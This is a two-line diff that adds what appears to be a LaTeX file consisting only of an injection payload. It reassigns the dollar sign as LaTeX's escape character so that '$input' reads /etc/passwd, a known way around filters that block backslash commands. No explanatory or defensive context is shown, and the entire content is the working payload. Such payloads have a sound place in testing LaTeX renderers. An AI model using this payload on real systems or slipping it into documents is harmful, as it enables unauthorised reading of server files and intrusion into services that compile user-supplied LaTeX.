@@ -1,0 +1,2 @@
+\catcode `\$=0
+$input{/etc/passwd}
